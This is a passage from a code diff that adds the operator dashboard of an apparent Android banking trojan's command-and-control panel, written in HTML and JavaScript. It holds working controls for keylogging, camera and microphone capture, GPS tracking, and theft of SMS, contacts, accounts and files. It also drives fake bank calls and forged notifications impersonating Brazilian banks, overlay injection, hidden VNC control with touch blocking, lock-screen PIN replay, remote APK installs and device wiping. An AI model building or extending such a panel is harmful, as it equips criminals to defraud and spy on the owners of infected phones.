+              <div class="btn-group">
+                <button class="btn btn-danger btn-sm" onclick="cmd('START_UNLOCK_RECORDING')">Start Record</button>
+                <button class="btn btn-ghost btn-sm"  onclick="cmd('STOP_UNLOCK_RECORDING')">Stop Record</button>
+              </div>
+              <div class="sep"></div>
+              <div class="btn-group">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('PLAY_UNLOCK_SEQUENCE')">Play Sequence</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('PLAY_PIN_SEQUENCE')">Play PIN</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('PLAY_PATTERN_SEQUENCE')">Play Pattern</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('PATTERN_UNLOCK')">Pattern Unlock</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('HIDE_LOCKSCREEN')">Hide Lockscreen</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('SHOW_LOCKSCREEN')">Show Lockscreen</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Surveillance ───────────────────── -->
+      <section id="sec-surveillance">
+        <div class="section-hdr"><div class="section-title">Surveillance</div></div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">📷 Camera</div>
+            <div class="card-body">
+              <div class="btn-group mb-10">
+                <button class="btn btn-success btn-sm" onclick="cmd('TOGGLE_CAMERA',{enabled:true})">Start Camera</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('TOGGLE_CAMERA',{enabled:false})">Stop Camera</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('SWITCH_CAMERA')">Switch</button>
+              </div>
+              <canvas id="cameraCanvas" style="width:100%;max-height:220px;border-radius:var(--radius);background:#000;display:block"></canvas>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">🎤 Microphone</div>
+            <div class="card-body">
+              <div class="btn-group mb-10">
+                <button class="btn btn-success btn-sm" onclick="cmd('TOGGLE_MICROPHONE',{enabled:true})">Start Mic</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('TOGGLE_MICROPHONE',{enabled:false})">Stop Mic</button>
+              </div>
+              <canvas id="audioViz" width="280" height="64" style="width:100%;border-radius:var(--radius);background:#0a0a10;display:block"></canvas>
+              <div style="margin-top:6px;font-size:11px;color:var(--text3)" id="audioStatus">Inactive</div>
+            </div>
+          </div>
+          <div class="card" style="grid-column:1/-1">
+            <div class="card-header">
+              ⌨ Keylogger
+              <div class="btn-group" style="margin-left:auto">
+                <button class="btn btn-success btn-sm" onclick="cmd('TOGGLE_KEYLOGGER',{enabled:true})">Start</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('TOGGLE_KEYLOGGER',{enabled:false})">Stop</button>
+                <button class="btn btn-ghost btn-sm"   onclick="$i('keylogStream').textContent=''">Clear</button>
+              </div>
+            </div>
+            <div style="padding:0">
+              <div class="keylog-stream" id="keylogStream">Keylog stream will appear here…</div>
+            </div>
+          </div>
+          <div class="card" style="grid-column:1/-1">
+            <div class="card-header">
+              📍 Location
+              <button class="btn btn-primary btn-sm" style="margin-left:auto" onclick="cmd('GET_LOCATION')">Get Location</button>
+            </div>
+            <div class="card-body">
+              <div id="locationDisplay" class="map-placeholder">
+                <div class="icon">📍</div>
+                <div>Press "Get Location" to request GPS data</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Data ──────────────────────────── -->
+      <section id="sec-data">
+        <div class="section-hdr"><div class="section-title">Data Exfiltration</div></div>
+        <div class="btn-group mb-14">
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_SMS')">📨 SMS</button>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_CONTACTS')">👥 Contacts</button>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_ACCOUNTS')">🔑 Accounts</button>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_GOOGLE_ACCOUNTS')">Google Acc</button>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_DEVICE_INFO')">Device Info</button>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_INSTALLED_APPS')">Apps</button>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_FILES')">📁 Files</button>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_CLIPBOARD')">📋 Clipboard</button>
+        </div>
+        <div class="tab-bar">
+          <button class="tab-btn active" onclick="switchTab(this,'sms')">SMS</button>
+          <button class="tab-btn" onclick="switchTab(this,'contacts')">Contacts</button>
+          <button class="tab-btn" onclick="switchTab(this,'accounts')">Accounts</button>
+          <button class="tab-btn" onclick="switchTab(this,'dapps')">Apps</button>
+          <button class="tab-btn" onclick="switchTab(this,'files')">Files</button>
+          <button class="tab-btn" onclick="switchTab(this,'klog')">Keylog</button>
+        </div>
+        <div class="tab-pane active card" id="tp-sms"><div class="table-wrap">
+          <table><thead><tr><th>Address</th><th>Body</th><th>Date</th><th>Type</th></tr></thead>
+          <tbody id="smsTbody"><tr><td colspan="4" style="text-align:center;color:var(--text3)">Request SMS first</td></tr></tbody></table>
+        </div></div>
+        <div class="tab-pane card" id="tp-contacts"><div class="table-wrap">
+          <table><thead><tr><th>Name</th><th>Phone</th><th>Email</th></tr></thead>
+          <tbody id="contactsTbody"><tr><td colspan="3" style="text-align:center;color:var(--text3)">Request contacts first</td></tr></tbody></table>
+        </div></div>
+        <div class="tab-pane card" id="tp-accounts"><div class="table-wrap">
+          <table><thead><tr><th>Account</th><th>Type</th></tr></thead>
+          <tbody id="accountsTbody"><tr><td colspan="2" style="text-align:center;color:var(--text3)">Request accounts first</td></tr></tbody></table>
+        </div></div>
+        <div class="tab-pane card" id="tp-dapps"><div class="table-wrap">
+          <table><thead><tr><th>Name</th><th>Package</th><th>Version</th><th></th></tr></thead>
+          <tbody id="dataAppsTbody"><tr><td colspan="4" style="text-align:center;color:var(--text3)">Request app list first</td></tr></tbody></table>
+        </div></div>
+        <div class="tab-pane card" id="tp-files"><div class="table-wrap">
+          <table><thead><tr><th>Name</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead>
+          <tbody id="filesTbody"><tr><td colspan="4" style="text-align:center;color:var(--text3)">Request files first</td></tr></tbody></table>
+        </div></div>
+        <div class="tab-pane" id="tp-klog">
+          <div class="keylog-stream" id="keylogData">No keylog data yet…</div>
+        </div>
+      </section>
+
+      <!-- ▸ Apps ──────────────────────────── -->
+      <section id="sec-apps">
+        <div class="section-hdr">
+          <div class="section-title">App Management</div>
+          <button class="btn btn-ghost btn-sm" onclick="cmd('GET_INSTALLED_APPS')">Refresh</button>
+        </div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">▶ Launch & Manage</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Package Name</label>
+                <input class="input" id="pkgName" placeholder="com.example.app">
+              </div>
+              <div class="btn-group">
+                <button class="btn btn-success btn-sm" onclick="cmd('OPEN_APP',{package:gi('pkgName')})">Open</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('FORCE_STOP',{package:gi('pkgName')})">Force Stop</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('STOP_APP',{package:gi('pkgName')})">Stop</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('UNINSTALL',{package:gi('pkgName')})">Uninstall</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('DUPLICATE_APP',{package:gi('pkgName')})">Clone</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('SHOW_APP_UNAVAILABLE',{package:gi('pkgName')})">Unavailable</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">🔒 Block Apps</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Package</label>
+                <input class="input" id="blockPkg" placeholder="com.social.app">
+              </div>
+              <div class="btn-group mb-10">
+                <button class="btn btn-danger btn-sm" onclick="cmd('TOGGLE_BLOCK_APP',{package:gi('blockPkg'),block:true})">Block</button>
+                <button class="btn btn-ghost btn-sm"  onclick="cmd('TOGGLE_BLOCK_APP',{package:gi('blockPkg'),block:false})">Unblock</button>
+              </div>
+              <div class="sep"></div>
+              <div class="form-group"><label class="label">APK URL to install</label>
+                <div class="input-row">
+                  <input class="input" id="apkUrl" placeholder="http://server/app.apk">
+                  <button class="btn btn-primary btn-sm" onclick="cmd('INSTALL_APK',{url:gi('apkUrl')})">Install</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="card" style="grid-column:1/-1">
+            <div class="card-header">📋 Installed Apps</div>
+            <div class="table-wrap" style="max-height:320px">
+              <table><thead><tr><th>Name</th><th>Package</th><th>Version</th><th>Actions</th></tr></thead>
+              <tbody id="appsMgmtTbody"><tr><td colspan="4" style="text-align:center;color:var(--text3)">Request app list</td></tr></tbody></table>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Fake UI ────────────────────────── -->
+      <section id="sec-fakeui">
+        <div class="section-hdr"><div class="section-title">Fake UI Injection</div></div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">📞 Fake Call</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Caller Name</label><input class="input" id="fkCallerName" value="Banco Itaú"></div>
+              <div class="form-group"><label class="label">Caller Number</label><input class="input" id="fkCallerNum" value="+55 11 4004-4828"></div>
+              <div class="form-group"><label class="label">Bank Theme</label>
+                <select class="input" id="fkCallBank">
+                  <option value="">None</option><option value="itau">Itaú</option>
+                  <option value="santander">Santander</option><option value="bradesco">Bradesco</option>
+                  <option value="caixa">Caixa</option><option value="nubank">Nubank</option>
+                </select>
+              </div>
+              <div class="btn-group">
+                <button class="btn btn-success btn-sm" onclick="cmd('FAKE_CALL',{callerName:gi('fkCallerName'),callerNumber:gi('fkCallerNum'),bank:gi('fkCallBank')})">📞 Start</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('CANCEL_FAKE_CALL')">End</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">🔔 Fake Notification</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">App Package</label><input class="input" id="notifPkg" value="com.itau.enterprisebanking"></div>
+              <div class="form-group"><label class="label">Title</label><input class="input" id="notifTitle" value="Transferência recebida"></div>
+              <div class="form-group"><label class="label">Body</label><input class="input" id="notifBody" value="Pix de R$ 1.200,00 recebido"></div>
+              <button class="btn btn-primary btn-sm"
+                onclick="cmd('FORGE_NOTIFICATION',{package:gi('notifPkg'),title:gi('notifTitle'),body:gi('notifBody')})">
+                Send Notification
+              </button>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">⬛ Black Screen</div>
+            <div class="card-body">
+              <div class="btn-group mb-10">
+                <button class="btn btn-danger btn-sm" onclick="cmd('BLACK_SCREEN_ON')">On</button>
+                <button class="btn btn-ghost btn-sm"  onclick="cmd('BLACK_SCREEN_OFF')">Off</button>
+                <button class="btn btn-ghost btn-sm"  onclick="cmd('TOGGLE_BLACK_SCREEN')">Toggle</button>
+              </div>
+              <div class="form-group"><label class="label">Opacity (0–255)</label>
+                <div class="input-row"><input class="input" type="number" id="bsOpacity" min="0" max="255" value="255">
+                  <button class="btn btn-primary btn-sm" onclick="cmd('SET_BLACK_SCREEN_OPACITY',{opacity:+gi('bsOpacity')})">Set</button></div>
+              </div>
+              <div class="btn-group mt-10">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('TOGGLE_BLACK_SCREEN_TOUCH',{block:true})">Block Touch</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('TOGGLE_BLACK_SCREEN_TOUCH',{block:false})">Allow Touch</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('SET_TOUCH_BLOCK',{block:true})">Set Block</button>
+              </div>
+              <div class="sep"></div>
+              <div class="form-group"><label class="label">Custom HTML overlay</label>
+                <textarea class="input" id="bsHtml" style="height:56px;resize:vertical" placeholder="<div>...</div>"></textarea>
+              </div>
+              <button class="btn btn-primary btn-sm" onclick="cmd('CUSTOM_BLACK_SCREEN',{html:gi('bsHtml')})">Apply HTML</button>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">🗺 Overlay Mapping</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Mapping JSON</label>
+                <textarea class="input" id="overlayJson" style="height:72px;resize:vertical"
+                  placeholder='{"package":"com.bank","coords":[]}'></textarea>
+              </div>
+              <div class="btn-group">
+                <button class="btn btn-primary btn-sm" onclick="armOverlay()">Arm</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('DISARM_OVERLAY_MAPPING')">Disarm</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('DELETE_OVERLAY_MAPPING')">Delete</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Overlay ────────────────────────── -->
+      <section id="sec-overlay">
+        <div class="section-hdr"><div class="section-title">Overlay & Screen Persistence</div></div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">🔲 Overlay Services</div>
+            <div class="card-body">
+              <div class="btn-group">
+                <button class="btn btn-primary btn-sm" onclick="cmd('REQUEST_OVERLAY_PERMISSION')">Request Overlay Perm</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('OPEN_SETTINGS')">Open Settings</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">💤 Screen Wake</div>
+            <div class="card-body">
+              <div class="btn-group">
+                <button class="btn btn-success btn-sm" onclick="cmd('SCREEN_PERSISTENCE',{enabled:true})">Keep Screen On</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('SCREEN_PERSISTENCE',{enabled:false})">Stop Persistence</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('WAKE_UP')">Wake Up</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('WAKEUP')">WAKEUP</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('POWER')">Power</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ System ─────────────────────────── -->
+      <section id="sec-system">
+        <div class="section-hdr"><div class="section-title">System Control</div></div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">🛡 Admin & Permissions</div>
+            <div class="card-body">
+              <div class="btn-group mb-10">
+                <button class="btn btn-primary btn-sm" onclick="cmd('CHECK_ADMIN_STATUS')">Check Admin</button>
+                <button class="btn btn-primary btn-sm" onclick="cmd('REQUEST_ADMIN_PERMISSION')">Request Admin</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('CHECK_PERMISSIONS')">Check Perms</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('REQUEST_PERMISSION')">Request Perm</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('REQUEST_IGNORE_BATTERY')">No Battery Opt</button>
+              </div>
+              <div class="sep"></div>
+              <div class="btn-group">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('CONFIGURE_ROM')">Configure ROM</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('OPEN_SETTINGS')">Open Settings</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('RECONNECT_CONNECTION')">Reconnect</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('PING')">Ping</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">👻 Stealth</div>
+            <div class="card-body">
+              <div class="btn-group mb-10">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('STEALTH_STATUS')">Get Status</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('TOGGLE_SCREEN_READER')">Toggle Screen Reader</button>
+              </div>
+              <div class="form-group"><label class="label">Threat Level (0–3)</label>
+                <div class="input-row"><input class="input" type="number" id="threatLvl" min="0" max="3" value="1">
+                  <button class="btn btn-primary btn-sm" onclick="cmd('SET_THREAT_LEVEL',{level:+gi('threatLvl')})">Set</button></div>
+              </div>
+              <div class="sep"></div>
+              <div class="form-row">
+                <div class="form-group"><label class="label">Bot Option Key</label><input class="input" id="botKey" placeholder="option_key"></div>
+                <div class="form-group"><label class="label">Value</label><input class="input" id="botVal" placeholder="value"></div>
+              </div>
+              <div class="btn-group mt-10">
+                <button class="btn btn-primary btn-sm" onclick="cmd('TOGGLE_BOT_OPTION',{key:gi('botKey'),value:gi('botVal')})">Set Option</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('TOGGLE_KILLER_MODE',{enabled:true})">Killer ON</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('TOGGLE_KILLER_MODE',{enabled:false})">Killer OFF</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">ℹ Device Info
+              <button class="btn btn-ghost btn-sm" style="margin-left:auto" onclick="cmd('GET_DEVICE_INFO')">Refresh</button>
+            </div>
+            <div class="card-body">
+              <div id="devInfoDisplay" style="font-size:11px;color:var(--text2);font-family:monospace;word-break:break-all;line-height:1.7">
+                Select a device to view info.
+              </div>
+            </div>
+          </div>
+          <div class="card" style="border-color:rgba(239,68,68,.35)">
+            <div class="card-header" style="color:var(--red)">⚠️ Danger Zone</div>
+            <div class="card-body">
+              <div class="btn-group">
+                <button class="btn btn-danger" onclick="if(confirm('Format device? This cannot be undone.'))cmd('FORMAT_DEVICE')">🗑 Format Device</button>
+                <button class="btn btn-danger" onclick="if(confirm('Self destruct? This will uninstall the agent.'))cmd('SELF_DESTRUCT')">💣 Self Destruct</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Plugins ────────────────────────── -->
+      <section id="sec-plugins">
+        <div class="section-hdr"><div class="section-title">Plugin Management</div></div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">🔌 Manage</div>
+            <div class="card-body">
+              <button class="btn btn-ghost btn-sm mb-10" onclick="cmd('LIST_PLUGINS')">List Plugins</button>
+              <div class="form-group"><label class="label">Plugin ID</label>
+                <input class="input" id="pluginId" placeholder="plugin_id">
+              </div>
+              <div class="btn-group">
+                <button class="btn btn-success btn-sm" onclick="cmd('LOAD_PLUGIN',{id:gi('pluginId')})">Load</button>
+                <button class="btn btn-danger btn-sm"  onclick="cmd('UNLOAD_PLUGIN',{id:gi('pluginId')})">Unload</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">▶ Execute</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Plugin ID</label><input class="input" id="execPid" placeholder="plugin_id"></div>
+              <div class="form-group"><label class="label">Arguments (JSON)</label>
+                <textarea class="input" id="execPargs" style="height:56px" placeholder='{"key":"value"}'></textarea>
+              </div>
+              <button class="btn btn-primary btn-sm" onclick="execPlugin()">Execute</button>
+            </div>
+          </div>
+          <div class="card" style="grid-column:1/-1">
+            <div class="card-header">📋 Plugin List</div>
+            <div class="table-wrap">
+              <table><thead><tr><th>ID</th><th>Name</th><th>Status</th><th>Actions</th></tr></thead>
+              <tbody id="pluginsTbody"><tr><td colspan="4" style="text-align:center;color:var(--text3)">No plugins loaded</td></tr></tbody></table>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Log ───────────────────────────── -->
+      <section id="sec-logs">
+        <div class="section-hdr">
+          <div class="section-title">Activity Log</div>
+          <div class="btn-group" style="margin-left:auto">
+            <button class="btn btn-ghost btn-sm" onclick="clearLog()">Clear</button>
+            <button class="btn btn-ghost btn-sm" onclick="exportLog()">Export</button>
+          </div>
+        </div>
+        <div class="log-panel" id="logPanel"></div>
+      </section>
+
+    </main>
+  </div>
+</div>
+<div id="toasts"></div>
+
+<script>
+'use strict';
+// ─────────────────────────────────────────────
+//  State
+// ─────────────────────────────────────────────
+const S = {
+  ws:           null,
+  connected:    false,
+  reconnDelay:  1000,    // exponential backoff base ms
+  devices:      {},
+  selectedId:   null,
+  readerV:      2,       // 1 = VNC, 2 = SilentVNC
+  hvncActive:   false,
+  cmdCount:     0,
+  logCount:     0,
+  devW:         350,
+  devH:         650,
+  fps:          0,
+  _fCount:      0,
+  _fTs:         Date.now(),
+  _qualTimer:   null,   // debounce for quality slider
+};
+
+// ─────────────────────────────────────────────
+//  DOM shortcuts
+// ─────────────────────────────────────────────
+const $i = (id)   => document.getElementById(id);
+const gi = (id)   => ($i(id) ? $i(id).value : '');
+const esc = (s)   => String(s ?? '')
+  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+
+// ─────────────────────────────────────────────
+//  Toast notifications
+// ─────────────────────────────────────────────
+function toast(msg, type = 'info') {
+  const el = document.createElement('div');
+  el.className = `toast ${type}`;
+  el.textContent = msg;
+  $i('toasts').appendChild(el);
+  setTimeout(() => el.remove(), 3200);
+}
+
+// ─────────────────────────────────────────────
+//  Activity log
+// ─────────────────────────────────────────────
+function ts() {
+  const d = new Date();
+  return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`;
+}
+
+function log(type, msg) {
+  const panel = $i('logPanel');
+  if (!panel) return;
+  const entry = document.createElement('div');
+  entry.className = 'log-entry';
+  entry.innerHTML =
+    `<span class="log-ts">${ts()}</span>` +
+    `<span class="log-type ${type}">[${type.toUpperCase()}]</span>` +
+    `<span class="log-msg">${esc(msg)}</span>`;
+  panel.appendChild(entry);
+  // Keep last 500 entries
+  while (panel.children.length > 500) panel.removeChild(panel.firstChild);
+  panel.scrollTop = panel.scrollHeight;
+  S.logCount++;
+  const b = $i('bdg-logs');
+  if (b) b.textContent = S.logCount > 99 ? '99+' : S.logCount;
+}
+
+function clearLog() {
+  const p = $i('logPanel');
+  if (p) p.innerHTML = '';
+  S.logCount = 0;
+  const b = $i('bdg-logs');
+  if (b) b.textContent = '0';
+}
+
+function exportLog() {
+  const lines = [...$i('logPanel').querySelectorAll('.log-entry')]
+    .map(el => el.innerText).join('\n');
+  const blob = new Blob([lines], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `c2log_${Date.now()}.txt`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+// ─────────────────────────────────────────────
+//  WebSocket connection (exponential backoff)
+// ─────────────────────────────────────────────
+function connect() {
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  const url   = `${proto}//${location.host}/panel`;
+  const ws    = new WebSocket(url);
+  ws.binaryType = 'arraybuffer';
+  S.ws = ws;
+
+  if ($i('serverAddr')) $i('serverAddr').textContent = location.host;
+
+  ws.onopen = () => {
+    S.connected   = true;
+    S.reconnDelay = 1000; // reset backoff
+    setConnBadge('ok', 'Connected');
+    log('ok', `Connected to ${location.host}`);
+    // Re-select device if one was chosen
+    if (S.selectedId) {
+      ws.send(JSON.stringify({ action: 'SELECT_DEVICE', deviceId: S.selectedId }));
+    }
+  };
+
+  ws.onclose = () => {
+    S.connected = false;
+    setConnBadge('err', `Reconnecting in ${(S.reconnDelay/1000).toFixed(1)}s…`);
+    log('err', `Disconnected — retry in ${S.reconnDelay}ms`);
+    setTimeout(connect, S.reconnDelay);
+    // Exponential backoff capped at 30s
+    S.reconnDelay = Math.min(S.reconnDelay * 2, 30000);
+  };
+
+  ws.onerror = () => {
+    // onclose fires right after, no need to duplicate log
+  };
+
+  ws.onmessage = (evt) => {
+    if (evt.data instanceof ArrayBuffer) {
+      handleBinary(evt.data);
+    } else {
+      let msg;
+      try { msg = JSON.parse(evt.data); } catch { return; }
+      handleJson(msg);
+    }
+  };
+}
+
+function send(obj) {
+  if (S.ws && S.ws.readyState === 1 /* OPEN */) {
+    S.ws.send(JSON.stringify(obj));
+  }
+}
+
+// ─────────────────────────────────────────────
+//  Binary frame handler
+// ─────────────────────────────────────────────
+const screenCanvas = $i('screenCanvas');
+const screenCtx    = screenCanvas.getContext('2d', { alpha: false });
+const cameraCanvas = $i('cameraCanvas');
+const cameraCtx    = cameraCanvas.getContext('2d', { alpha: false });
+
+// ResizeObserver: recalculate canvas size when container changes
+const resizeObs = new ResizeObserver(() => {
+  if (S.hvncActive) resizeCanvas();
+});
+resizeObs.observe($i('canvasArea'));
+
+function resizeCanvas() {
+  const area = $i('canvasArea');
+  if (!area) return;
+  const mw = area.clientWidth  || 400;
+  const mh = area.clientHeight || 600;
+  const aspect = S.devW / S.devH;
+  if (mw / mh > aspect) {
+    screenCanvas.width  = Math.round(mh * aspect);
+    screenCanvas.height = mh;
+  } else {
+    screenCanvas.width  = mw;
+    screenCanvas.height = Math.round(mw / aspect);
+  }
+}
+
+function handleBinary(ab) {
+  const buf = new Uint8Array(ab);
+  if (buf.length < 5) return;
+  const frameType = buf[0];
+  if (frameType === 0x01) {
+    // Screen frame: [0x01][4-byte big-endian size][JPEG]
+    const len = ((buf[1] << 24) | (buf[2] << 16) | (buf[3] << 8) | buf[4]) >>> 0;
+    if (ab.byteLength < 5 + len) return;
+    renderScreen(ab.slice(5, 5 + len));
+  }
+}
+
+function renderScreen(jpegBuf) {
+  const blob = new Blob([jpegBuf], { type: 'image/jpeg' });
+  createImageBitmap(blob).then((bm) => {
+    if (!bm.width || !bm.height) { bm.close(); return; }
+    // Update device resolution from first real frame
+    if (bm.width !== S.devW || bm.height !== S.devH) {
+      S.devW = bm.width;
+      S.devH = bm.height;
+      resizeCanvas();
+    }
+    // Show canvas, hide placeholder
+    screenCanvas.style.display = 'block';
+    const ph = $i('canvasPh');
+    if (ph) ph.style.display = 'none';
+    showHUD();
+    screenCtx.drawImage(bm, 0, 0, screenCanvas.width, screenCanvas.height);
+    bm.close();
+    // FPS
+    S._fCount++;
+    const now = Date.now();
+    if (now - S._fTs >= 1000) {
+      S.fps     = S._fCount;
+      S._fCount = 0;
+      S._fTs    = now;
+      const hf  = $i('hudFps');
+      if (hf) hf.textContent = S.fps + ' FPS';
+    }
+  }).catch(() => {});
+}
+
+function showHUD() {
+  const els = [$i('hudFps'), $i('hudQ'), $i('hudReader')];
+  els.forEach(el => { if (el) el.style.display = ''; });
+}
+
+function renderCamera(b64) {
+  const img = new Image();
+  img.onload = () => {
+    cameraCanvas.width  = img.width  || 320;
+    cameraCanvas.height = img.height || 240;
+    cameraCtx.drawImage(img, 0, 0);
+  };
+  img.src = 'data:image/jpeg;base64,' + b64;
+}
+
+// ─────────────────────────────────────────────
+//  Canvas interaction → commands
+// ─────────────────────────────────────────────
+let dragStart = null, dragging = false;
+
+function canvasCoords(e) {
+  const r  = screenCanvas.getBoundingClientRect();
+  const sx = S.devW / r.width;
+  const sy = S.devH / r.height;
+  return { x: Math.round((e.clientX - r.left) * sx), y: Math.round((e.clientY - r.top) * sy) };
+}
+
+function dist2(a, b) { return Math.hypot(a.x - b.x, a.y - b.y); }
+
+screenCanvas.addEventListener('mousedown', (e) => {
+  screenCanvas.focus();
+  dragStart = canvasCoords(e);
+  dragging  = false;
+  e.preventDefault();
+});
+
+screenCanvas.addEventListener('mousemove', (e) => {
+  if (!dragStart) return;
+  if (dist2(dragStart, canvasCoords(e)) > 8) dragging = true;
+});
+
+screenCanvas.addEventListener('mouseup', (e) => {
+  if (!dragStart) return;
+  const p = canvasCoords(e);
+  if (!dragging) {
+    cmd('TAP', { x: p.x, y: p.y });
+    spawnRing(e.clientX, e.clientY);
+  } else {
+    cmd('SWIPE', { x1: dragStart.x, y1: dragStart.y, x2: p.x, y2: p.y, duration: 350 });
+  }
+  dragStart = null;
+  dragging  = false;
+});
+
+screenCanvas.addEventListener('dblclick', (e) => {
+  const p = canvasCoords(e);
+  cmd('LONG_PRESS', { x: p.x, y: p.y, duration: 1200 });
+  e.preventDefault();
+});
+
+// Touch (mobile dashboard access)
+screenCanvas.addEventListener('touchstart', (e) => {
+  const t = e.touches[0];
+  dragStart = canvasCoords({ clientX: t.clientX, clientY: t.clientY });
+  dragging  = false;
+  e.preventDefault();
+}, { passive: false });
+
+screenCanvas.addEventListener('touchend', (e) => {
+  if (!dragStart) return;
+  const t = e.changedTouches[0];
+  const p = canvasCoords({ clientX: t.clientX, clientY: t.clientY });
+  if (!dragging) {
+    cmd('TAP', { x: p.x, y: p.y });
+  } else {
+    cmd('SWIPE', { x1: dragStart.x, y1: dragStart.y, x2: p.x, y2: p.y, duration: 350 });
+  }
+  dragStart = null;
+  dragging  = false;
+  e.preventDefault();
+}, { passive: false });
+
+// Keyboard → type
+let canvasFocused = false;
+screenCanvas.addEventListener('focus', () => { canvasFocused = true;  });
+screenCanvas.addEventListener('blur',  () => { canvasFocused = false; });
+
+document.addEventListener('keydown', (e) => {
+  if (!canvasFocused) return;
+  const specials = {
+    Escape:    'BACK',
+    Home:      'HOME',
+    Delete:    'RECENTS',
+    F1:        'QUICK_SETTINGS',
+    F2:        'POWER_MENU',
+  };
+  if (specials[e.key]) {
+    e.preventDefault();
+    cmd(specials[e.key]);
+  } else if (e.key === 'Enter') {
+    e.preventDefault(); cmd('TYPE', { text: '\n' });
+  } else if (e.key === 'Backspace') {
+    e.preventDefault(); cmd('TYPE', { text: '\b' });
+  } else if (e.key === 'Tab') {
+    e.preventDefault(); cmd('TYPE', { text: '\t' });
+  } else if (e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
+    e.preventDefault(); cmd('TYPE', { text: e.key });
+  }
+});
+
+function spawnRing(cx, cy) {
+  const area = $i('canvasArea');
+  if (!area) return;
+  const r    = area.getBoundingClientRect();
+  const el   = document.createElement('div');
+  el.className = 'touch-ring';
+  el.style.left = (cx - r.left) + 'px';
+  el.style.top  = (cy - r.top)  + 'px';
+  area.appendChild(el);
+  setTimeout(() => el.remove(), 700);
+}
+
+// ─────────────────────────────────────────────
+//  HVNC controls
+// ─────────────────────────────────────────────
+function setReader(v) {
